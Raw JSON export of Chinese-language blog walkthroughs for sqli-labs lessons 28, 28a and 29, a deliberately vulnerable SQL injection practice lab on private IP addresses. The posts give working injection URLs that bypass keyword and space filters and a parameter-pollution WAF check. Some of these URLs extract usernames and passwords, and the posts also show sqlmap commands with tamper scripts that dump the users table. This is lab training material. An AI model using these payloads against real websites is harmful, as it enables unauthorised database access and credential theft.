--tables`\n\n![011](/img/sql/Lesson-28/011.png)\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-28/?id=1\" --method GET --technique B --dbms mysql --threads 10  --tamper \"space0A.py,count.py\" -D security -T users --columns --dump`\n\n![012](/img/sql/Lesson-28/012.png)\n\n\n\n\n","slug":"sqli-labs-lession-28-GET基于错误-你的UNION和SELECT归我所有-字符型单引号和括号","published":1,"updated":"2019-06-19T17:23:13.390Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istdl003l4dsbp9jf16ej","content":"<h1 id=\"sqli-labs-lession-28-GET基于错误-你的UNION和SELECT归我所有-字符型单引号和括号\"><a href=\"#sqli-labs-lession-28-GET基于错误-你的UNION和SELECT归我所有-字符型单引号和括号\" class=\"headerlink\" title=\"sqli-labs lession-28 GET基于错误-你的UNION和SELECT归我所有-字符型单引号和括号\"></a>sqli-labs lession-28 GET基于错误-你的UNION和SELECT归我所有-字符型单引号和括号</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-28/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>这标题有毒吧,不是基于错误吗,结果源码里把报错注释了,结果我做成布尔盲注了。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">blacklist</span><span class=\"params\">($id)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/[\\/\\*]/'</span>,<span class=\"string\">\"\"</span>, $id);\t\t<span class=\"comment\">//过滤 / *.</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/[--]/'</span>,<span class=\"string\">\"\"</span>, $id);\t\t<span class=\"comment\">//过滤 -.</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/[#]/'</span>,<span class=\"string\">\"\"</span>, $id);\t\t\t<span class=\"comment\">//过滤 #.</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/[ +]/'</span>,<span class=\"string\">\"\"</span>, $id);\t\t<span class=\"comment\">//过滤 空格 +.</span></span><br><span class=\"line\"><span class=\"comment\">//$id= preg_replace('/select/m',\"\", $id);\t</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/[ +]/'</span>,<span class=\"string\">\"\"</span>, $id);\t    <span class=\"comment\">//过滤 空格 +.</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/union\\s+select/i'</span>,<span class=\"string\">\"\"</span>, $id);\t <span class=\"comment\">//过滤无论大小写的（UNION 空格符 SELECT）.单独的不会过虑。</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> $id;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>绕过空格都是前几课做的,这里就将绕过过滤（UNION 空格符 SELECT）</p>\n<ol>\n<li>用<code>union all select</code>替代<code>union 空格符 select</code></li>\n</ol>\n<p><code>http://192.168.75.132/sql/Less-28/?id=4&#39;)%0AuNion%0Aall%0AseLect%0A1,2,3%0Aand(&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-28/002.png\" alt=\"002\"></p>\n<ol start=\"2\">\n<li>用<code>%A0</code>替代空格</li>\n</ol>\n<p><code>%A0</code>有时候会被解析成特殊字符,php-5.2.17版本可行</p>\n<p><code>http://192.168.75.132/sql/Less-28/?id=4&#39;)%0AuNion%A0seLect%0A1,2,3%0Aand(&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-28/003.png\" alt=\"003\"></p>\n<ol start=\"3\">\n<li>双写绕过用<code>unionuNion%0AseLect%0Aselect</code>替代<code>union select</code></li>\n</ol>\n<p><code>http://192.168.75.132/sql/Less-28/?id=2&#39;)%0AunionuNion%0AseLect%0Aselect%0A1,2,3%0Aand(&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-28/004.png\" alt=\"004\"></p>\n<ol start=\"4\">\n<li>在union和select中间添加谓词  （distinct,distinctrow）</li>\n</ol>\n<p><code>http://192.168.75.132/sql/Less-28/?id=3&#39;)%0AuNion%0Adistinct%0AseLect%0A1,2,3%0Aand(&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-28/005.png\" alt=\"005\"></p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><p>直接结果</p>\n<p><code>http://192.168.75.132/sql/Less-28/?id=2&#39;and%0A1=2)%0Aunion%0Aall%0AseLect%0A1,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;security&#39;)),3%0A%0Aand(&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-28/006.png\" alt=\"006\"></p>\n<p><code>http://192.168.75.132/sql/Less-28/?id=2&#39;and%0A1=2)%0Aunion%0Aall%0AseLect%0A1,(select(group_concat(id,&#39;~&#39;,username,&#39;~&#39;,password))from(security.users)),3%0A%0Aand(&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-28/007.png\" alt=\"007\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>写了的<code>union select</code>绕过脚本没用上。</p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-28/?id=1&quot; --method GET --technique B --dbms mysql --threads 10 --level 2 --flush-session --fresh-queries --tamper &quot;space0A.py&quot; -v 3</code></p>\n<p><img src=\"/img/sql/Lesson-28/008.png\" alt=\"008\"></p>\n<p><img src=\"/img/sql/Lesson-28/009.png\" alt=\"009\"></p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-28/?id=1&quot; --method GET --technique B --dbms mysql --threads 10 --level 2  --tamper &quot;space0A.py&quot; --dbs</code></p>\n<p><img src=\"/img/sql/Lesson-28/010.png\" alt=\"010\"></p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-28/?id=1&quot; --method GET --technique B --dbms mysql --threads 10  --tamper &quot;space0A.py&quot; -v 3 -D security --tables</code></p>\n<p><img src=\"/img/sql/Lesson-28/011.png\" alt=\"011\"></p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-28/?id=1&quot; --method GET --technique B --dbms mysql --threads 10  --tamper &quot;space0A.py,count.py&quot; -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-28/012.png\" alt=\"012\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-28-GET基于错误-你的UNION和SELECT归我所有-字符型单引号和括号\"><a href=\"#sqli-labs-lession-28-GET基于错误-你的UNION和SELECT归我所有-字符型单引号和括号\" class=\"headerlink\" title=\"sqli-labs lession-28 GET基于错误-你的UNION和SELECT归我所有-字符型单引号和括号\"></a>sqli-labs lession-28 GET基于错误-你的UNION和SELECT归我所有-字符型单引号和括号</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-28/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>这标题有毒吧,不是基于错误吗,结果源码里把报错注释了,结果我做成布尔盲注了。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">blacklist</span><span class=\"params\">($id)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/[\\/\\*]/'</span>,<span class=\"string\">\"\"</span>, $id);\t\t<span class=\"comment\">//过滤 / *.</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/[--]/'</span>,<span class=\"string\">\"\"</span>, $id);\t\t<span class=\"comment\">//过滤 -.</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/[#]/'</span>,<span class=\"string\">\"\"</span>, $id);\t\t\t<span class=\"comment\">//过滤 #.</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/[ +]/'</span>,<span class=\"string\">\"\"</span>, $id);\t\t<span class=\"comment\">//过滤 空格 +.</span></span><br><span class=\"line\"><span class=\"comment\">//$id= preg_replace('/select/m',\"\", $id);\t</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/[ +]/'</span>,<span class=\"string\">\"\"</span>, $id);\t    <span class=\"comment\">//过滤 空格 +.</span></span><br><span class=\"line\">$id= preg_replace(<span class=\"string\">'/union\\s+select/i'</span>,<span class=\"string\">\"\"</span>, $id);\t <span class=\"comment\">//过滤无论大小写的（UNION 空格符 SELECT）.单独的不会过虑。</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> $id;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>绕过空格都是前几课做的,这里就将绕过过滤（UNION 空格符 SELECT）</p>\n<ol>\n<li>用<code>union all select</code>替代<code>union 空格符 select</code></li>\n</ol>\n<p><code>http://192.168.75.132/sql/Less-28/?id=4&#39;)%0AuNion%0Aall%0AseLect%0A1,2,3%0Aand(&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-28/002.png\" alt=\"002\"></p>\n<ol start=\"2\">\n<li>用<code>%A0</code>替代空格</li>\n</ol>\n<p><code>%A0</code>有时候会被解析成特殊字符,php-5.2.17版本可行</p>\n<p><code>http://192.168.75.132/sql/Less-28/?id=4&#39;)%0AuNion%A0seLect%0A1,2,3%0Aand(&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-28/003.png\" alt=\"003\"></p>\n<ol start=\"3\">\n<li>双写绕过用<code>unionuNion%0AseLect%0Aselect</code>替代<code>union select</code></li>\n</ol>\n<p><code>http://192.168.75.132/sql/Less-28/?id=2&#39;)%0AunionuNion%0AseLect%0Aselect%0A1,2,3%0Aand(&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-28/004.png\" alt=\"004\"></p>\n<ol start=\"4\">\n<li>在union和select中间添加谓词  （distinct,distinctrow）</li>\n</ol>\n<p><code>http://192.168.75.132/sql/Less-28/?id=3&#39;)%0AuNion%0Adistinct%0AseLect%0A1,2,3%0Aand(&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-28/005.png\" alt=\"005\"></p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><p>直接结果</p>\n<p><code>http://192.168.75.132/sql/Less-28/?id=2&#39;and%0A1=2)%0Aunion%0Aall%0AseLect%0A1,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;security&#39;)),3%0A%0Aand(&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-28/006.png\" alt=\"006\"></p>\n<p><code>http://192.168.75.132/sql/Less-28/?id=2&#39;and%0A1=2)%0Aunion%0Aall%0AseLect%0A1,(select(group_concat(id,&#39;~&#39;,username,&#39;~&#39;,password))from(security.users)),3%0A%0Aand(&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-28/007.png\" alt=\"007\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>写了的<code>union select</code>绕过脚本没用上。</p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-28/?id=1&quot; --method GET --technique B --dbms mysql --threads 10 --level 2 --flush-session --fresh-queries --tamper &quot;space0A.py&quot; -v 3</code></p>\n<p><img src=\"/img/sql/Lesson-28/008.png\" alt=\"008\"></p>\n<p><img src=\"/img/sql/Lesson-28/009.png\" alt=\"009\"></p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-28/?id=1&quot; --method GET --technique B --dbms mysql --threads 10 --level 2  --tamper &quot;space0A.py&quot; --dbs</code></p>\n<p><img src=\"/img/sql/Lesson-28/010.png\" alt=\"010\"></p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-28/?id=1&quot; --method GET --technique B --dbms mysql --threads 10  --tamper &quot;space0A.py&quot; -v 3 -D security --tables</code></p>\n<p><img src=\"/img/sql/Lesson-28/011.png\" alt=\"011\"></p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-28/?id=1&quot; --method GET --technique B --dbms mysql --threads 10  --tamper &quot;space0A.py,count.py&quot; -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-28/012.png\" alt=\"012\"></p>\n"},{"title":"sqli-labs lession-28a GET基于盲注-你的UNION和SELECT归我所有-字符型单引号和括号","date":"2018-10-07T14:36:30.000Z","_content":"\n# sqli-labs lession-28a GET基于盲注-你的UNION和SELECT归我所有-字符型单引号和括号\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-28a/001.png)\n\n## 分析\n\n这Lesson-28a比Lesson28还简单,注释了那么多...作者搞返了吧。\n\n![002](/img/sql/Lesson-28a/002.png)\n\n那这里主要分析一下少了这些过滤又有多什么玩法,Lesson-28用过的就不提了,而且这课就不跑SQLMAP了。\n\n1. `/**/`内联注释绕过\n\n   `http://192.168.75.132/sql/Less-28a/?id=1')/**/union/**/select 1,2,3%23`\n\n   ![003](/img/sql/Lesson-28a/003.png)\n\n2. 关键字处用`/!*关键字*/`绕过\n\n   例如： `/*!50000select*/`\n\n   `http://192.168.75.132/sql/Less-28a/?id=2')/*!union*/select 1,2,3%23`\n\n   ![004](/img/sql/Lesson-28a/004.png)\n\n3. 注释加换行符（%23%0A或--%0A）\n\n   `http://192.168.75.132/sql/Less-28a/?id=2') union%23%0Aselect 1,2,3%23`\n\n   ![005](/img/sql/Lesson-28a/005.png)\n\n4.   用括号绕过\n\n\n\n   `http://192.168.75.132/sql/Less-28a/?id=-1%27)%20union(select 1,(database()),3)%23`\n\n   ![006](/img/sql/Lesson-28a/006.png)\n\n\n","source":"_posts/sqli-labs-lession-28a-GET基于盲注-你的UNION和SELECT归我所有-字符型单引号和括号.md","raw":"---\ntitle: sqli-labs lession-28a GET基于盲注-你的UNION和SELECT归我所有-字符型单引号和括号\ndate: 2018-10-07 22:36:30\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-28a GET基于盲注-你的UNION和SELECT归我所有-字符型单引号和括号\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-28a/001.png)\n\n## 分析\n\n这Lesson-28a比Lesson28还简单,注释了那么多...作者搞返了吧。\n\n![002](/img/sql/Lesson-28a/002.png)\n\n那这里主要分析一下少了这些过滤又有多什么玩法,Lesson-28用过的就不提了,而且这课就不跑SQLMAP了。\n\n1. `/**/`内联注释绕过\n\n   `http://192.168.75.132/sql/Less-28a/?id=1')/**/union/**/select 1,2,3%23`\n\n   ![003](/img/sql/Lesson-28a/003.png)\n\n2. 关键字处用`/!*关键字*/`绕过\n\n   例如： `/*!50000select*/`\n\n   `http://192.168.75.132/sql/Less-28a/?id=2')/*!union*/select 1,2,3%23`\n\n   ![004](/img/sql/Lesson-28a/004.png)\n\n3. 注释加换行符（%23%0A或--%0A）\n\n   `http://192.168.75.132/sql/Less-28a/?id=2') union%23%0Aselect 1,2,3%23`\n\n   ![005](/img/sql/Lesson-28a/005.png)\n\n4.   用括号绕过\n\n\n\n   `http://192.168.75.132/sql/Less-28a/?id=-1%27)%20union(select 1,(database()),3)%23`\n\n   ![006](/img/sql/Lesson-28a/006.png)\n\n\n","slug":"sqli-labs-lession-28a-GET基于盲注-你的UNION和SELECT归我所有-字符型单引号和括号","published":1,"updated":"2019-06-19T17:23:13.390Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istdq003p4dsb51fwx9g3","content":"<h1 id=\"sqli-labs-lession-28a-GET基于盲注-你的UNION和SELECT归我所有-字符型单引号和括号\"><a href=\"#sqli-labs-lession-28a-GET基于盲注-你的UNION和SELECT归我所有-字符型单引号和括号\" class=\"headerlink\" title=\"sqli-labs lession-28a GET基于盲注-你的UNION和SELECT归我所有-字符型单引号和括号\"></a>sqli-labs lession-28a GET基于盲注-你的UNION和SELECT归我所有-字符型单引号和括号</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-28a/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>这Lesson-28a比Lesson28还简单,注释了那么多…作者搞返了吧。</p>\n<p><img src=\"/img/sql/Lesson-28a/002.png\" alt=\"002\"></p>\n<p>那这里主要分析一下少了这些过滤又有多什么玩法,Lesson-28用过的就不提了,而且这课就不跑SQLMAP了。</p>\n<ol>\n<li><p><code>/**/</code>内联注释绕过</p>\n<p><code>http://192.168.75.132/sql/Less-28a/?id=1&#39;)/**/union/**/select 1,2,3%23</code></p>\n<p><img src=\"/img/sql/Lesson-28a/003.png\" alt=\"003\"></p>\n</li>\n<li><p>关键字处用<code>/!*关键字*/</code>绕过</p>\n<p>例如： <code>/*!50000select*/</code></p>\n<p><code>http://192.168.75.132/sql/Less-28a/?id=2&#39;)/*!union*/select 1,2,3%23</code></p>\n<p><img src=\"/img/sql/Lesson-28a/004.png\" alt=\"004\"></p>\n</li>\n<li><p>注释加换行符（%23%0A或–%0A）</p>\n<p><code>http://192.168.75.132/sql/Less-28a/?id=2&#39;) union%23%0Aselect 1,2,3%23</code></p>\n<p><img src=\"/img/sql/Lesson-28a/005.png\" alt=\"005\"></p>\n</li>\n<li><p>用括号绕过</p>\n</li>\n</ol>\n<p>   <code>http://192.168.75.132/sql/Less-28a/?id=-1%27)%20union(select 1,(database()),3)%23</code></p>\n<p>   <img src=\"/img/sql/Lesson-28a/006.png\" alt=\"006\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-28a-GET基于盲注-你的UNION和SELECT归我所有-字符型单引号和括号\"><a href=\"#sqli-labs-lession-28a-GET基于盲注-你的UNION和SELECT归我所有-字符型单引号和括号\" class=\"headerlink\" title=\"sqli-labs lession-28a GET基于盲注-你的UNION和SELECT归我所有-字符型单引号和括号\"></a>sqli-labs lession-28a GET基于盲注-你的UNION和SELECT归我所有-字符型单引号和括号</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-28a/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>这Lesson-28a比Lesson28还简单,注释了那么多…作者搞返了吧。</p>\n<p><img src=\"/img/sql/Lesson-28a/002.png\" alt=\"002\"></p>\n<p>那这里主要分析一下少了这些过滤又有多什么玩法,Lesson-28用过的就不提了,而且这课就不跑SQLMAP了。</p>\n<ol>\n<li><p><code>/**/</code>内联注释绕过</p>\n<p><code>http://192.168.75.132/sql/Less-28a/?id=1&#39;)/**/union/**/select 1,2,3%23</code></p>\n<p><img src=\"/img/sql/Lesson-28a/003.png\" alt=\"003\"></p>\n</li>\n<li><p>关键字处用<code>/!*关键字*/</code>绕过</p>\n<p>例如： <code>/*!50000select*/</code></p>\n<p><code>http://192.168.75.132/sql/Less-28a/?id=2&#39;)/*!union*/select 1,2,3%23</code></p>\n<p><img src=\"/img/sql/Lesson-28a/004.png\" alt=\"004\"></p>\n</li>\n<li><p>注释加换行符（%23%0A或–%0A）</p>\n<p><code>http://192.168.75.132/sql/Less-28a/?id=2&#39;) union%23%0Aselect 1,2,3%23</code></p>\n<p><img src=\"/img/sql/Lesson-28a/005.png\" alt=\"005\"></p>\n</li>\n<li><p>用括号绕过</p>\n</li>\n</ol>\n<p>   <code>http://192.168.75.132/sql/Less-28a/?id=-1%27)%20union(select 1,(database()),3)%23</code></p>\n<p>   <img src=\"/img/sql/Lesson-28a/006.png\" alt=\"006\"></p>\n"},{"title":"sqli-labs lession-29 GET基于错误-阻抗不匹配-有WAF的web应用","date":"2018-10-14T07:10:34.000Z","_content":"\n# sqli-labs lession 29 GET基于错误-阻抗不匹配-有WAF的web应用\n\n---\n\n\n\n## 登录界面\n\n![001](/img/sql/Lesson-29/001.png)\n\n## 分析\n\n这一课真正的登录界面是在login.php里,跟index.php的区别是进行了过滤。\n\nlogin.php中接受参数依次通过了自定义函数java_implimentation和whitelist过滤。\n\n![002](/img/sql/Lesson-29/002.png)\n\n```\nfunction java_implimentation($query_string)\n{\n\t$q_s = $query_string;\n\t$qs_array= explode(\"&\",$q_s);\n\n\n\tforeach($qs_array as $key => $value)\n\t{\n\t\t$val=substr($value,0,2);\n\t\tif($val==\"id\")\n\t\t{\n\t\t\t$id_value=substr($value,3,30); \n\t\t\treturn $id_value;\n\t\t\techo \"<br>\";\n\t\t\tbreak;\n\t\t}\n\t}\n}\n\nfunction whitelist($input)\n{\n\t$match = preg_match(\"/^\\d+$/\", $input);\n\tif($match)\n\t{\n\t\t//echo \"you are good\";\n\t\t//return $match;\n\t}\n\telse\n\t{\t\n\t\theader('Location: hacked.php');\n\t\t//echo \"you are bad\";\n\t}\n}\n```\n\njava_implimentation通过explode将url中传递的参数以&分割保存在数组中，随后查找id和id的内容。whitelist检查id的值是否是纯数字。不符合规范跳转错误界面。\n\n![003](/img/sql/Lesson-29/003.png)\n\n但是通过这个例子发现有重复参数的时候它没有检查。&是传参中用来多个参数传递的。就有了下面的绕过方法。\n\n![004](/img/sql/Lesson-29/004.png)\n\n## 手注\n\n### 获取字段数\n\n`http://192.168.75.133/sql/Less-29/login.php?id=1&id=2' order by 4%23`\n\n![005](/img/sql/Lesson-29/005.png)\n\n### 获取数据库名\n\n`http://192.168.75.133/sql/Less-29/login.php?id=1&id=2' and extractvalue(null,concat(0x7e,database(),0x7e))%23`\n\n![006](/img/sql/Lesson-29/006.png)\n\n### 获取表名\n\n`http://192.168.75.133/sql/Less-29/login.php?id=1&id=2' and extractvalue(null,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e))%23`\n\n![007](/img/sql/Lesson-29/007.png)\n\n### 获取列名\n\n`http://192.168.75.133/sql/Less-29/login.php?id=1&id=2' and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),0x7e))%23`\n\n![008](/img/sql/Lesson-29/008.png)\n\n### 获取字段\n\n`http://192.168.75.133/sql/Less-29/login.php?id=1&id=2' and extractvalue(null,concat(0x7e,(select concat(username,'~',password) from security.users limit 1,1),0x7e))%23`\n\n![009](/img/sql/Lesson-29/009.png)\n\n## SQLMAP\n\n```\n--technique E:检查报错注入方式\n--threads 10：并发线程数为10\n--flush-session:刷新session\n--fresh-queries:发起新查询\n-v 3：显示测试过程\n```\n\n`sqlmap -u \"http://192.168.75.133/sql/Less-29/login.php?id=1&id=2\" --dbms mysql --technique E --threads 10 --flush-session --fresh-queries -v 3`\n\n![010](/img/sql/Lesson-29/010.png)\n\n`sqlmap -u \"http://192.168.75.133/sql/Less-29/login.php?id=1&id=2\" --dbms mysql --technique E --threads 10 --dbs`\n\n![011](/img/sql/Lesson-29/011.png)\n\n`sqlmap -u \"http://192.168.75.133/sql/Less-29/login.php?id=1&id=2\" --dbms mysql --technique E --threads 10 -D security -T users --columns --dump`\n\n![012](/img/sql/Lesson-29/012.png)\n\n","source":"_posts/sqli-labs-lession-29-GET基于错误-阻抗不匹配-有WAF的web应用.md","raw":"---\ntitle: sqli-labs lession-29 GET基于错误-阻抗不匹配-有WAF的web应用\ndate: 2018-10-14 15:10:34\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession 29 GET基于错误-阻抗不匹配-有WAF的web应用\n\n---\n\n\n\n## 登录界面\n\n![001](/img/sql/Lesson-29/001.png)\n\n## 分析\n\n这一课真正的登录界面是在login.php里,跟index.php的区别是进行了过滤。\n\nlogin.php中接受参数依次通过了自定义函数java_implimentation和whitelist过滤。\n\n![002](/img/sql/Lesson-29/002.png)\n\n```\nfunction java_implimentation($query_string)\n{\n\t$q_s = $query_string;\n\t$qs_array= explode(\"&\",$q_s);\n\n\n\tforeach($qs_array as $key => $value)\n\t{\n\t\t$val=substr($value,0,2);\n\t\tif($val==\"id\")\n\t\t{\n\t\t\t$id_value=substr($value,3,30); \n\t\t\treturn $id_value;\n\t\t\techo \"<br>\";\n\t\t\tbreak;\n\t\t}\n\t}\n}\n\nfunction whitelist($input)\n{\n\t$match = preg_match(\"/^\\d+$/\", $input);\n\tif($match)\n\t{\n\t\t//echo \"you are good\";\n\t\t//return $match;\n\t}\n\telse\n\t{\t\n\t\theader('Location: hacked.php');\n\t\t//echo \"you are bad\";\n\t}\n}\n```\n\njava_implimentation通过explode将url中传递的参数以&分割保存在数组中，随后查找id和id的内容。whitelist检查id的值是否是纯数字。不符合规范跳转错误界面。\n\n![003](/img/sql/Lesson-29/003.png)\n\n但是通过这个例子发现有重复参数的时候它没有检查。&是传参中用来多个参数传递的。就有了下面的绕过方法。\n\n![004](/img/sql/Lesson-29/004.png)\n\n## 手注\n\n### 获取字段数\n\n`http://192.168.75.133/sql/Less-29/login.php?id=1&id=2' order by 4%23`\n\n![005](/img/sql/Lesson-29/005.png)\n\n### 获取数据库名\n\n`http://192.168.75.133/sql/Less-29/login.php?id=1&id=2' and extractvalue(null,concat(0x7e,database(),0x7e))%23`\n\n![006](/img/sql/Lesson-29/006.png)\n\n### 获取表名\n\n`http://192.168.75.133/sql/Less-29/login.php?id=1&id=2' and extractvalue(null,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e))%23`\n\n![007](/img/sql/Lesson-29/007.png)\n\n### 获取列名\n\n`http://192.168.75.133/sql/Less-29/login.php?id=1&id=2' and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),0x7e))%23`\n\n![008](/img/sql/Lesson-29/008.png)\n\n### 获取字段\n\n`http://192.168.75.133/sql/Less-29/login.php?id=1&id=2' and extractvalue(null,concat(0x7e,(select concat(username,'~',password) from security.users limit 1,1),0x7e))%23`\n\n![009](/img/sql/Lesson-29/009.png)\n\n## SQLMAP\n\n```\n--technique E:检查报错注入方式\n--threads 10：并发线程数为10\n--flush-session:刷新session\n--fresh-queries:发起新查询\n-v 3：显示测试过程\n```\n\n`sqlmap -u \"http://192.168.75.133/sql/Less-29/login.php?id=1&id=2\" --dbms mysql --technique E --threads 10 --flush-session --fresh-queries -v 3`\n\n![010](/img/sql/Lesson-29/010.png)\n\n`sqlmap -u \"http://192.168.75.133/sql/Less-29/login.php?id=1&id=2\" --dbms mysql --technique E --threads 10 --dbs`\n\n![011](/img/sql/Lesson-29/011.png)\n\n`sqlmap -u \"http://192.168.75.133/sql/Less-29/login.php?id=1&id=2\" --dbms mysql --technique E --threads 10 -D security -T users --columns --dump`\n\n![012](/img/sql/Lesson-29/012.png)\n\n","slug":"sqli-labs-lession-29-GET基于错误-阻抗不匹配-有WAF的web应用","published":1,"updated":"2019-06-19T17:23:13.390Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istdr003r4dsbl06xkgxy","content":"<h1 id=\"sqli-labs-lession-29-GET基于错误-阻抗不匹配-有WAF的web应用\"><a href=\"#sqli-labs-lession-29-GET基于错误-阻抗不匹配-有WAF的web应用\" class=\"headerlink\" title=\"sqli-labs lession 29 GET基于错误-阻抗不匹配-有WAF的web应用\"></a>sqli-labs lession 29 GET基于错误-阻抗不匹配-有WAF的web应用</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-29/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>这一课真正的登录界面是在login.php里,跟index.php的区别是进行了过滤。</p>\n<p>login.php中接受参数依次通过了自定义函数java_implimentation和whitelist过滤。</p>\n<p><img src=\"/img/sql/Lesson-29/002.png\" alt=\"002\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span 